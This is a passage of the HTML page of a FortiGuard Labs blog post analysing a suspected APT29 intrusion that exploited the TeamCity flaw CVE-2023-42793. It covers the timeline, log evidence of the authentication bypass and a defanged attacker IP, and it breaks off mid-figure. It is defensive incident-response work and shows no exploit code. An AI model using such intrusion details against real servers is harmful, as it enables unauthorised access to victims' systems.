
    <!DOCTYPE HTML>
    <html lang="en" data-template="post-page">
    <head>
        
        
        
            <link rel="preload" as="script" href="/etc/designs/fortinet/adb-target/visitorapi.min.js"/>
            <link rel="preload" as="script" href="/etc/designs/fortinet/adb-target/at.js"/>
            <script>

                   ;(function(win, doc, style, timeout) {
                   var STYLE_ID = 'at-body-style';
                   function getParent() {
                      return doc.getElementsByTagName('head')[0];
                   }
                   function addStyle(parent, id, def) {
                      if (!parent) {
                      return;
                      }
                      var style = doc.createElement('style');
                      style.id = id;
                      style.innerHTML = def;
                      parent.appendChild(style);
                   }
                   function removeStyle(parent, id) {
                      if (!parent) {
                      return;
                      }
                      var style = doc.getElementById(id);
                      if (!style) {
                      return;
                      }
                      parent.removeChild(style);
                   }
                   addStyle(getParent(), STYLE_ID, style);
                   setTimeout(function() {
                      removeStyle(getParent(), STYLE_ID);
                   }, timeout);
                   }(window, document, "body {opacity: 0 !important}", 3000));
                </script>
            <script type="text/plain" class="optanon-category-C0003" src="/etc/designs/fortinet/adb-target/visitorapi.min.js"></script>
            <script type="text/plain" class="optanon-category-C0003" src="/etc/designs/fortinet/adb-target/at.js"></script>
        
        
    <meta charset="UTF-8"/>
    <title>TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs</title>
    <meta name="keywords" content="FortiGuard Labs Threat Research,cve"/>
    <meta name="description" content="FortiGuardLabs discovered a new APT29 campaign which includes TeamCity exploitation and GraphicalProton malware. Learn more."/>
    <meta name="template" content="post-page"/>
    

    <meta name="viewport" content="width=device-width, initial-scale=1"/>


<meta name="google-site-verification" content="tiQ03tSujT2TSsWJ6tNHiiUn8cwYVmdMQrGUCNrPQmo"/>

<meta property="og:site_name" content="Fortinet Blog"/>
<meta property="og:title" content="TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs"/>
<meta property="og:url" content="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"/>
<meta property="og:type" content="article"/>
<meta property="og:description" content="FortiGuardLabs discovered a new APT29 campaign which includes TeamCity exploitation and GraphicalProton malware. Learn more.…"/>
<meta property="og:image" content="https://www.fortinet.com/content/dam/fortinet-blog/article-heros/teamcity-hero.png"/>

<meta property="twitter:card" content="summary"/>
<meta property="twitter:site" content="@Fortinet"/>

<meta property="article:author" content="Amey Gat, Mark Robson, John Simmons, Ken Evans, Jared Betts, Angelo Cris Deveraturda, Hongkei Chan, Jayesh Zala"/>

    <meta property="article:section" content="FortiGuard Labs Threat Research"/>


    <meta property="article:published_time" content="2023-12-13T15:00:00.000Z"/>


    <meta property="article:tag" content="cve"/>


<link rel="shortcut icon" href="/etc/designs/fortinet-blog/favicon.ico"/>

<link rel="canonical" href="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"/>










    
<link rel="stylesheet" href="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.900b148ab7b87024003111a1245cca9c.css" type="text/css">





<!-- SEO Script -->




<!-- OneTrust Cookies Consent Notice start for fortinet.com -->



    <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="f85f39fc-d7aa-467a-b762-fbb722748016"></script>
    <script type="text/javascript">

function OptanonWrapper() {
    {
       try{
            $('#cookiescript_injected').remove(); // remove old cookie script
        }catch(e){}
        window.dataLayer.push({
            event: 'OneTrustGroupsUpdated'
        });
        Optanon.InsertScript('//assets.adobedtm.com/launch-EN23cb8375449840dc93b13f34d935b8b9.min.js','head',null, null, '1',true);
    }
}

</script>


<!-- OneTrust Cookies Consent Notice end for fortinet.com -->
    
    
    

    
    

    
    
    
    

    

    

    

    

    



        <!-- BE IXF: BE IXF: Place getHeadOpen just inside of the head tag -->
        
        
<!-- be_ixf, sdk, gho-->
<meta name="be:sdk" content="java_sdk_1.6.7" />
<meta name="be:timer" content="30ms" />
<meta name="be:norm_url" content="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793" />
<meta name="be:capsule_url" content="https://ixfd1-api.bc0a.com/api/ixf/1.0.0/get_capsule/f00000000310757/01894606163" />
<meta name="be:api_dt" content="pny_2024; pnm_10; pnd_22; pnh_11; pnmh_14; pn_epoch:1729620888654" />
<meta name="be:mod_dt" content="pny_1969; pnm_12; pnd_31; pnh_16; pnmh_00; pn_epoch:0" />
<meta name="be:orig_url" content="https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793" />
<meta name="be:messages" content="34165" /><script type='text/javascript'>
if (window.BEJSSDKObserver === undefined) {
  (function(BEJSSDKObserver, $, undefined) {
    var observer = void 0;
    var listeners = [];
    var readySet = [];
    var doc = window.document;
    var MutationObserver = window.MutationObserver || window.WebKitMutationObserver;

    function checkSelector(selector, fn, indexList) {
      var elements = doc.querySelectorAll(selector);
  /**
    issues on IE @see https://www.codesd.com/item/javascript-es6-not-a-function-error.html
    elements = Array.from(elements);

    */
    for (var i = 0, len = elements.length; i < len; i++) {
      /* -1 means all instances */
      if (indexList != -1 && !(i in indexList)) {
        continue;
      }
      var element = elements[i];
      for (var j = 0; j < readySet.length; j++) {
        if (readySet[j] == element.className || readySet[j] == element.id) {
          return;
        }
      }
      if (element.className) {
        readySet.push(element.className);
      }
      if (element.id) {
        readySet.push(element.id);
      }

      if (!element.ready || MutationObserver==null) {
        element.ready = true;
        fn.call(element, element);
      }
    }
  }

  function checkListeners() {
    listeners.forEach(function (listener) {
      return checkSelector(listener.selector, listener.fn, listener.indexList);
    });
  }

  function removeListener(selector, fn) {
    var i = listeners.length;
    while (i--) {
      var listener = listeners[i];
      if (listener.selector === selector && listener.fn === fn) {
        listeners.splice(i, 1);
        if (!listeners.length && observer) {
          observer.disconnect();
          observer = null;
        }
      }
    }
  }

/**
 * Fire event on first js selector
 * @param selector string to watch on
 * @param fn       callback function
 * @param index_list can be undefined which means only first one
 *                   or -1 which means all
 *                   or a list of allowable indexes
 */
 BEJSSDKObserver.jsElementReady = function(selector, fn, index_list) {
  if (index_list === undefined) {
    index_list = [];
    index_list.push(0);
  }

  if (MutationObserver != null) {
    if (!observer) {
      observer = new MutationObserver(checkListeners);
      observer.observe(doc.documentElement, {
        childList: true,
        subtree: true
      });
    }
    listeners.push({ selector: selector, fn: fn, indexList: index_list });
  } else {
    /* <= IE8 */
    if (!document.addEventListener) {
      /* log("<=IE8 attachEvent assignment"); */
      document.addEventListener = document.attachEvent;
    }
    document.addEventListener("DOMContentLoaded", function(event) {
      var elements = doc.querySelectorAll(selector);
      for (var i = 0, len = elements.length; i < len; i++) {
        /* -1 means all instances */
        if (index_list != -1 && !(i in index_list)) {
          continue;
        }
        var element = elements[i];
        element.ready = true;
        fn.call(element, element);
      }
    });
  }

  checkSelector(selector, fn, index_list);
  return function () {
    return removeListener(selector, fn);
  };
};
}(window.BEJSSDKObserver = window.BEJSSDKObserver || {}));
}
var jsElementReady = window.BEJSSDKObserver.jsElementReady;

if (window.BELinkBlockGenerator === undefined) {
  (function(BELinkBlockGenerator, $, undefined) {
    BELinkBlockGenerator.MAXIMUM_HEADLINE_LENGTH = 100;
    BELinkBlockGenerator.MAXIMUM_DESC_LENGTH = 200;

    BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_URL_TYPE = 0;
    BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_HEADLINE_TYPE = 1;
    BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_DESCRIPTION_TYPE = 2;
    BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_IMAGE_TYPE = 3;

    BELinkBlockGenerator.REPLACEMENT_STRATEGY_OVERWRITE = 0;
    BELinkBlockGenerator.REPLACEMENT_STRATEGY_POST_APPEND_ELEMENT = 1;
    BELinkBlockGenerator.REPLACEMENT_STRATEGY_PRE_APPEND_ELEMENT = 2;
    BELinkBlockGenerator.REPLACEMENT_STRATEGY_PRE_APPEND_PARENT = 3;

    BELinkBlockGenerator.setMaximumHeadlineLength = function(length) {
      BELinkBlockGenerator.MAXIMUM_HEADLINE_LENGTH = length;
    };

    BELinkBlockGenerator.setMaximumDescriptionLength = function(length) {
      BELinkBlockGenerator.MAXIMUM_DESC_LENGTH = length;
    };

    BELinkBlockGenerator.generateIndividualLinks = function(parentElement, linkStructure, link) {
      var link_level_element_tag = linkStructure[0];
      var link_level_element = document.createElement(link_level_element_tag);
      var link_attribute_dictionary = linkStructure[1];
      var allowable_elements = linkStructure[2];
      var children_link_structures = linkStructure[3];
      for (var link_attribute_key in link_attribute_dictionary) {
        link_level_element.setAttribute(link_attribute_key, link_attribute_dictionary[link_attribute_key]);
      }

      var added_something = false;
      if (allowable_elements.indexOf(BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_URL_TYPE)>=0) {
        link_level_element.setAttribute('href', link.url);
        added_something = true;
      }
      if (allowable_elements.indexOf(BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_HEADLINE_TYPE)>=0 && link.h1) {
        var headline_text = link.h1;
        if (headline_text.length > BELinkBlockGenerator.MAXIMUM_HEADLINE_LENGTH) {
          headline_text = headline_text.substring(0, BELinkBlockGenerator.MAXIMUM_HEADLINE_LENGTH) + '...';
        }
        var text_node = document.createTextNode(headline_text);
        link_level_element.appendChild(text_node);
        added_something = true;
      }
      if (allowable_elements.indexOf(BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_DESCRIPTION_TYPE)>=0 && link.desc) {
        var desc_text = link.desc;
        if (desc_text.length > BELinkBlockGenerator.MAXIMUM_DESC_LENGTH) {
          desc_text = desc_text.substring(0, BELinkBlockGenerator.MAXIMUM_DESC_LENGTH) + '...';
        }
        var text_node = document.createTextNode(desc_text);
        link_level_element.appendChild(text_node);
        added_something = true;
      }
      if (allowable_elements.indexOf(BELinkBlockGenerator.IND_LINK_BLOCK_TYPE_IMAGE_TYPE)>=0 && link.image) {
        link_level_element.setAttribute('src', link.image);
        added_something = true;
      }
/**
    don't emit for empty links, desc, headline, image
    except for parent structures where allowable_length=0
    */
    if (!added_something && allowable_elements.length != 0) {

      return;
    }
    /* go depth first */
    for (var childrenIndex=0; childrenIndex<children_link_structures.length; childrenIndex++) {
      var childLinkStructure = children_link_structures[childrenIndex];
      BELinkBlockGenerator.generateIndividualLinks(link_level_element, childLinkStructure, link);
    }
    parentElement.appendChild(link_level_element);
  };

  BELinkBlockGenerator.insertLinkBlocks = function(targetElement, replacementStrategy, overallStructure, linkStructure, links,
                                                   titleStructure) {
    if (targetElement == null) {
      return;
    }

    if (replacementStrategy == BELinkBlockGenerator.REPLACEMENT_STRATEGY_OVERWRITE) {
      while (targetElement.firstChild) {
        targetElement.removeChild(targetElement.firstChild);
      }
    }

    var previousElement = targetElement;
    for (var i=0;i<overallStructure.length;i++) {
      var level_definition = overallStructure[i];
      var level_element_tag = level_definition[0];
      var level_element = document.createElement(level_element_tag);
      var attribute_dictionary = level_definition[1];
      for (var attribute_key in attribute_dictionary) {
        level_element.setAttribute(attribute_key, attribute_dictionary[attribute_key]);
      }

      /* need to place title structure */
      if (titleStructure && titleStructure[0] == i) {
        var title_element_tag = titleStructure[1];
        var title_element = document.createElement(title_element_tag);
        var title_attribute_dictionary = titleStructure[2];
        var title_text_content = titleStructure[3];
        for (var title_attribute_key in title_attribute_dictionary) {
          title_element.setAttribute(title_attribute_key, title_attribute_dictionary[title_attribute_key]);
        }

        var title_text_node = document.createTextNode(title_text_content);
        title_element.appendChild(title_text_node);


        level_element.appendChild(title_element);
      }

      /* last level place links */
      if (i == overallStructure.length-1) {
        for (var link_i=0; link_i < links.length; link_i++) {
          var link = links[link_i];
          for (var linkStructureIndex=0;linkStructureIndex < linkStructure.length; linkStructureIndex++) {
            BELinkBlockGenerator.generateIndividualLinks(level_element, linkStructure[linkStructureIndex], link)
          }
        }
      }

      /* first level child we need to check placement */
      if (previousElement == targetElement) {
        if (replacementStrategy == BELinkBlockGenerator.REPLACEMENT_STRATEGY_PRE_APPEND_ELEMENT) {
          /* 2 means insert right before */
          previousElement.insertBefore(level_element, targetElement.firstChild);
        } else if (replacementStrategy == BELinkBlockGenerator.REPLACEMENT_STRATEGY_PRE_APPEND_PARENT) {
          /* 3 means insert right before at parent level */
          var parentElement = previousElement.parentElement;
          parentElement.insertBefore(level_element, previousElement);
        } else {
          previousElement.appendChild(level_element);
        }
      } else {
        previousElement.appendChild(level_element);
      }
      previousElement = level_element;
    }
  };
}(window.BELinkBlockGenerator = window.BELinkBlockGenerator || {}))
};
</script>


        <!--BE IXF: Header End -->


    </head>
    <body class="table-of-content-body">
    



    
<div class="root responsivegrid">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="b1-header aem-GridColumn aem-GridColumn--default--12">


<header class="b1-header__container">
    <div class="b1-header__logo">
        <a href="https://www.fortinet.com">
            
            <img class="desktop-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet home"/>
            <img class="mobile-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet home"/>
        </a>
    </div>

    <div class="b1-header__cta-list">
      <a class="b1-header__cta-list-item " href="https://www.fortinet.com/blog">
          <span>Blog</span>
      </a>
    </div>

    <div class="b1-header__nav"><div class="b2-navigation">




    <ul class="b2-navigation__list">
        
            <li class="b2-navigation-categories"><div class="b2-navigation__list-item nav-dropdown-title">Categories</div>
                <ul class="navdropdown">
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/business-and-technology">
                                <span>Business &amp; Technology </span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/threat-research">
                                <span>FortiGuard Labs Threat Research</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/industry-trends">
                                <span>Industry Trends</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/life-at-fortinet">
                                <span>Life at Fortinet</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/partners">
                                <span>Partners</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/customer-stories">
                                <span>Customer Stories</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/psirt-blogs">
                                <span>PSIRT Blogs</span>
                            </a>
                        </li>
                    
                </ul>
            </li>

        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/business-and-technology">
                    <span>Business &amp; Technology </span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/threat-research">
                    <span>FortiGuard Labs Threat Research</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/industry-trends">
                    <span>Industry Trends</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/life-at-fortinet">
                    <span>Life at Fortinet</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/partners">
                    <span>Partners</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/customer-stories">
                    <span>Customer Stories</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/psirt-blogs">
                    <span>PSIRT Blogs</span>
                </a>
            </li>
        
        
        
            <li>
                <a class="b2-navigation__list-item false" href="/blog/ciso-collective">
                    <span>CISO Collective</span>
                </a>
            </li>
        
    </ul>


    

</div>
</div>

    <div id="blog-site-search" class="b1-header__search" aria-expanded="false"><div class="b3-searchbox">


<form class="b3-searchbox__form" action="/blog/search" method="get">
    <input class="b3-searchbox__input" type="text" name="q" placeholder="Search Blogs"/>
    <button class="b3-searchbox__icon" aria-label="Search" type="submit">
        
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z" fill="#fff">
        </path>
    </svg>

    </button>
</form>


    

</div>
</div>

    <button class="b1-header__search-toggle" aria-controls="blog-site-search" aria-label="Search">
        
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z">
        </path>
    </svg>

        <div class="b1-header__search-toggle-close">
            <span class="b1-header__search-toggle-close-line"></span>
            <span class="b1-header__search-toggle-close-line"></span>
        </div>
    </button>

    <div class="b1-header__nav-toggle" aria-hidden="true">
        <span class="b1-header__nav-toggle-line"></span>
        <span class="b1-header__nav-toggle-line"></span>
        <span class="b1-header__nav-toggle-line"></span>
    </div>
</header>

    

</div>
<section class="b4-hero aem-GridColumn aem-GridColumn--default--12">



<div class="b4-hero__container" style="background-image:url(/content/dam/fortinet-blog/article-heros/teamcity-hero.png);">
    <img class="ratio" alt="TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
    <div class="b4-hero__text text-container">
        <p data-ly-test class="b4-hero__kicker">FortiGuard Labs Threat Research</p>
        
        
        

        <h1 class="b4-hero__headline">TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793</h1>
        
        
    </div>
</div>
</section>
<section class="b15-blog-meta aem-GridColumn aem-GridColumn--default--12">

<div class="b15-blog-meta__container text-container">
    <span>By </span>

    <span class="b15-blog-meta__author">

        
					

                        

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=Amey+Gat">Amey Gat,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Mark+Robson"> Mark Robson,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+John+Simmons"> John Simmons,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Ken+Evans"> Ken Evans,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Jared+Betts"> Jared Betts,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Angelo+Cris+Deveraturda"> Angelo Cris Deveraturda,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                              <a href="/blog/search?author=+Hongkei+Chan"> Hongkei Chan</a> and
                                          
                                           
                                      
                                  
                          

                                  
                                      
                                            
                                              <a href="/blog/search?author=+Jayesh+Zala"> Jayesh Zala</a>
                                          
                                          
                                           
                                      
                                  
                          
                    
        
    </span>
    <span class="b15-blog-meta__">
        

              </span>



    <span class="b15-blog-meta__date"> | December 13, 2023</span>
</div>
</section>
<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="Table-Content aem-GridColumn aem-GridColumn--default--12">
<div class="blog-toc">
    <div class="b3-blog-list__row ">
        <div class="b3-blog-list__column-left table-content-wrapper automatic">
            <ul class="table-of-content">
                <li class="header"><img class="toc-icon" src="/content/dam/fortinet/images/toc-icon.jpg" alt=""/>Article Contents</li>
                
            </ul>
        </div>
        <div class="aem-GridColumn aem-GridColumn--default--8 b3-blog-list__column-right scrolling-content automatic">
            

<div class="b15-blog-meta__container text-container">
    <span>By </span>

    <span class="b15-blog-meta__author">

        
					

                        

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=Amey+Gat">Amey Gat,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Mark+Robson"> Mark Robson,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+John+Simmons"> John Simmons,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Ken+Evans"> Ken Evans,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Jared+Betts"> Jared Betts,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                           
                                                 <a href="/blog/search?author=+Angelo+Cris+Deveraturda"> Angelo Cris Deveraturda,</a>
                                          
                                      
                                  
                          

                                  
                                      
                                            
                                          
                                              <a href="/blog/search?author=+Hongkei+Chan"> Hongkei Chan</a> and
                                          
                                           
                                      
                                  
                          

                                  
                                      
                                            
                                              <a href="/blog/search?author=+Jayesh+Zala"> Jayesh Zala</a>
                                          
                                          
                                           
                                      
                                  
                          
                    
        
    </span>
    <span class="b15-blog-meta__">
        

              </span>



    <span class="b15-blog-meta__date"> | December 13, 2023</span>
</div>

            




    
    
    <div class="cmp cmp-text">
  <p style="margin-left: 80.0px;"><b>Affected Platforms: </b>Machines running vulnerable JetBrains TeamCity versions (before 2023.05.4, per vendor advice)<br />
<b>Threat Type:</b> Remote Code Execution Vulnerability<br />
<b>Impact: </b>Remote code execution for unauthenticated users, enabling initial access to vulnerable servers<br />
<b>Security Level</b>: High</p>
<h2><span style="font-weight: normal;">Cyber Kill Chain®</span></h2>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image.img.png/1702312937909/cyber-kill-chain-1211.png" data-title="cyber kill chain">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image.img.png/1702312937909/cyber-kill-chain-1211.png" alt="cyber kill chain" class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    


    
</div>


    
    
    <div class="cmp cmp-text">
  <h2><span style="font-weight: normal;">Introduction</span></h2>
<p>On September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises vulnerability (CVE-2023-42793<a href="#_ftn1" name="_ftnref1" style="background-color: rgb(255,255,255);">[1]</a><span>) issue.</span><a href="#_ftn2" name="_ftnref2" style="background-color: rgb(255,255,255);">[2]</a><span> TeamCity is a build management and continuous integration server from JetBrains</span><a href="#_ftn3" name="_ftnref3" style="background-color: rgb(255,255,255);">[3]</a><span>. On September 27, 2023, a public exploit for this vulnerability was released by Rapid7</span><a href="#_ftn4" name="_ftnref4" style="background-color: rgb(255,255,255);">[4]</a><span>. This critical vulnerability was given a CVE score of 9.8, most likely because an attacker can deploy the publicly available exploit without authentication supporting remote code execution on the victim server using a basic web request to any accessible web server hosting the vulnerable application. This vulnerability has been observed being actively exploited in the wild and was added to CISA's 'Known Exploited Vulnerabilities Catalog' on October 4, 2023.</span><a href="#_ftn5" name="_ftnref5" style="background-color: rgb(255,255,255);">[5]</a><br />
</p>
<p>In mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy notification to an organization that had been compromised due to this vulnerability.  This organization engaged the FortiGuard IR team to investigate the malicious activity in their network.</p>
<p>The victim was a US-based organization in the biomedical manufacturing industry. Our subsequent investigation determined that initial access for the attack was through the exploitation of the CVE-2023-42793 TeamCity vulnerability using a custom-built exploit script written in Python. The behavior of the malware used in post-exploitation matches the GraphicalProton malware used by APT29. This article breaks down our investigation and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team. MITRE ATT&amp;CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to assist with threat-hunting activities for similar behavior.</p>
<h2><span style="font-weight: normal;">Summary of Attack</span></h2>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_786676972.img.png/1702071926980/fig01-teamcity-attack-timeline.png" data-title="Figure 1: The attack timeline of TeamCity intrusion described in this article.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_786676972.img.png/1702071926980/fig01-teamcity-attack-timeline.png" alt="Figure 1: The attack timeline of TeamCity intrusion described in this article." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 1: The attack timeline of TeamCity intrusion described in this article.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <h2><span style="font-weight: normal;">Analysis</span></h2>
<h3><span style="font-weight: normal;">Vulnerability Exploitation</span></h3>
<p>As part of our initial customer engagement, we examined several EDR events reported from one of the victim's Windows application servers (HOST_1_TEAMCITY). During a scoping call, the FortiGuard IR team identified that one of the applications hosted on this server was TeamCity. The victim had only recently updated the application to a non-vulnerable version.</p>
<p>We began by retrieving application and system logs from the suspected compromised server (HOST_1_TEAMCITY). On analysis of the application logs, we identified significant evidence of successful exploitation of the TeamCity vulnerability. The authentication bypass can be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_249607732.img.png/1702071954173/fig02-teamcity-snippet-highlighting-exploit-evidence-associated-remote-ip.png" data-title="Figure 2: A snippet of the &#39;teamcity-auth.log&#39; screenshot highlighting the TeamCity exploit evidence and associated remote IP.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_249607732.img.png/1702071954173/fig02-teamcity-snippet-highlighting-exploit-evidence-associated-remote-ip.png" alt="Figure 2: A snippet of the &#39;teamcity-auth.log&#39; screenshot highlighting the TeamCity exploit evidence and associated remote IP." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 2: A snippet of the &#39;teamcity-auth.log&#39; screenshot highlighting the TeamCity exploit evidence and associated remote IP.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Analysis of these logs showed that this vulnerability had been exploited multiple times over a relatively short period, with connections originating from multiple unique public IP addresses. The teamcity-auth.log (authentication events log) identifies successful exploitation but does not provide details on commands executed through exploitation. This information is available in the separate 'teamcity-server.log' file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo command execution log highlighted in the 'teamcity-server.log' entry in Figure 3. Details of the external command execution from the 'teamcity-server.log file can also be seen in Figure 3.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1444709118.img.png/1702071974304/fig03-teamcity-server-log-showing-execution-evidence.png" data-title="Figure 3: A snippet of the &#39;teamcity-server.log&#39; showing remote code execution evidence, including the associated command executed through the exploitation.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1444709118.img.png/1702071974304/fig03-teamcity-server-log-showing-execution-evidence.png" alt="Figure 3: A snippet of the &#39;teamcity-server.log&#39; showing remote code execution evidence, including the associated command executed through the exploitation." class="custom"/>
            </noscript>
